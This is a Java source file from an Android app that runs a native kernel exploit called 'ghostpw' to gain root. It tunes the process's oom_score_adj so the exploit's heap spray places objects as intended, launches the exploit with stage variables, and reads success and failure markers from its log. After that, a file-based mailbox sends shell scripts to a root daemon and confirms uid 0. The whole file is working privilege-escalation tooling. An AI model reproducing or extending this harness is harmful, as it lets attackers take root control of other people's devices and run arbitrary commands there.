package dev.ghostlock.runner;

import android.content.Context;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.RandomAccessFile;
import java.nio.charset.Charset;

/** Drives the ghostpw payload and the root command mailbox it leaves behind. */
final class Runner {

    interface Log {
        void line(String s);
    }

    /** Env for the verified slide_dep root path (see docs/EXPLOIT.md). */
    private static final String[][] EXPLOIT_ENV = {
            {"GHOST_STAGE", "slide_dep"},
            {"GHOST_WAITER_CORE", "2"},
            {"GHOST_PARK", "1"},
            {"GHOST_FOPS_TRUE", "1"},
    };

    static final int EXPLOIT_TIMEOUT_MS = 300_000;
    static final String RUN_LOG = "ghost_run.log";

    private Runner() {
    }

    static File runLog(Context ctx) {
        return new File(Payload.dir(ctx), RUN_LOG);
    }

    /**
     * The exploit's child spray was tuned for oom_score_adj=200 (the diag
     * app's value): LMK trims idle shaping children, shaping the slab
     * population the deposit grooms. A foreground app defaults to 0, which
     * keeps every child alive and breaks placement (observed: 12/12 cfi
     * misses). Raising our own adj is unprivileged; forked children inherit.
     */
    static void matchDiagOomAdj() {
        try {
            java.io.FileOutputStream f = new java.io.FileOutputStream(
                    "/proc/self/oom_score_adj");
            try {
                f.write("200".getBytes("UTF-8"));
            } finally {
                f.close();
            }
        } catch (Exception ignored) {
        }
    }

    /**
     * Starts ghostpw with stdout/stderr redirected to files/ghost_run.log.
     * Nothing is streamed while it runs: the exploit is timing sensitive and
     * per-line UI/file work measurably perturbs it. Returns the Process.
     */
    static Process startExploit(Context ctx) throws IOException {
        matchDiagOomAdj();
        File bin = Payload.binary(ctx);
        File work = Payload.dir(ctx);
        File log = runLog(ctx);

        ProcessBuilder pb = new ProcessBuilder(bin.getAbsolutePath());
        pb.directory(work);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(log));
        pb.environment().put("GHOST_ROOTDIR", work.getAbsolutePath());
        for (String[] kv : EXPLOIT_ENV) {
            pb.environment().put(kv[0], kv[1]);
        }
        return pb.start();
    }

    /** Last non-empty line of the run log, ANSI escapes stripped. "" if none. */
    static String lastLogLine(Context ctx) {
        File log = runLog(ctx);
        if (!log.exists()) {
            return "";
        }
        try {
            RandomAccessFile f = new RandomAccessFile(log, "r");
            try {
                long len = f.length();
                long start = Math.max(0, len - 8192);
                f.seek(start);
                byte[] raw = new byte[(int) (len - start)];
                f.readFully(raw);
                String tail = new String(raw, Charset.forName("UTF-8"));
                String[] lines = tail.split("\n");
                for (int i = lines.length - 1; i >= 0; i--) {
                    String s = stripAnsi(lines[i]).trim();
                    if (!s.isEmpty()) {
                        return s.length() > 160 ? s.substring(s.length() - 160) : s;
                    }
                }
            } finally {
                f.close();
            }
        } catch (Exception ignored) {
        }
        return "";
    }

    /** Whole run log as plain text lines (ANSI stripped). */
    static String runLogText(Context ctx) {
        File log = runLog(ctx);
        if (!log.exists()) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        try {
            BufferedReader r = new BufferedReader(new InputStreamReader(
                    new java.io.FileInputStream(log), Charset.forName("UTF-8")));
            String line;
            while ((line = r.readLine()) != null) {
                sb.append(stripAnsi(line)).append('\n');
            }
            r.close();
        } catch (IOException ignored) {
        }
        return sb.toString();
    }

    static String stripAnsi(String s) {
        return s == null ? "" : s.replaceAll("\\x1b\\[[0-9;]*m", "");
    }

    /** True when the exploit printed its success marker. */
    static boolean logHasSuccess(Context ctx) {
        return runLogText(ctx).contains("cfi ok");
    }

    /** True when the exploit exhausted its attempts. */
    static boolean logHasFailure(Context ctx) {
        String t = runLogText(ctx);
        return t.contains("cfi miss attempt=12") || t.contains("cfi miss attempt=11");
    }

    /** PID recorded by our ghost_rootd, or -1. */
    static int rootDaemonPid(Context ctx) {
        File pidFile = new File(Payload.dir(ctx), "rootd.pid");
        if (!pidFile.exists()) {
            return -1;
        }
        try {
            RandomAccessFile f = new RandomAccessFile(pidFile, "r");
            String s;
            try {
                s = f.readLine();
            } finally {
                f.close();
            }
            return Integer.parseInt(s.trim());
        } catch (Exception e) {
            return -1;
        }
    }

    /** True when the mailbox answers as uid 0. */
    static boolean channelAnswersAsRoot(Context ctx, Log log) {
        try {
            String out = rootCmd(ctx, "id", 8_000, null);
            return out.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Writes a script to files/rootcmd and waits for ghost_rootd to append to
     * files/rootout. Returns captured output including the [rc=N] marker.
     */
    static String rootCmd(Context ctx, String script, long timeoutMs, Log log)
            throws IOException, InterruptedException {
        File dir = Payload.dir(ctx);
        File cmd = new File(dir, "rootcmd");
        File out = new File(dir, "rootout");

        FileOutputStream trunc = new FileOutputStream(out, false);
        trunc.close();

        FileOutputStream os = new FileOutputStream(cmd, false);
        try {
            OutputStreamWriter w = new OutputStreamWriter(os, Charset.forName("UTF-8"));
            w.write(script);
            if (!script.endsWith("\n")) {
                w.write("\n");
            }
            w.flush();
        } finally {
            os.close();
        }

        long deadline = System.currentTimeMillis() + timeoutMs;
        StringBuilder sb = new StringBuilder();
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(300);
            sb.setLength(0);
            if (out.exists()) {
                byte[] raw = new byte[(int) out.length()];
                RandomAccessFile f = new RandomAccessFile(out, "r");
                try {
                    f.readFully(raw);
                } finally {
                    f.close();
                }
                sb.append(new String(raw, Charset.forName("UTF-8")));
            }
            if (sb.indexOf("[rc=") >= 0) {
                return sb.toString();
            }
        }
        return sb.toString();
    }
}
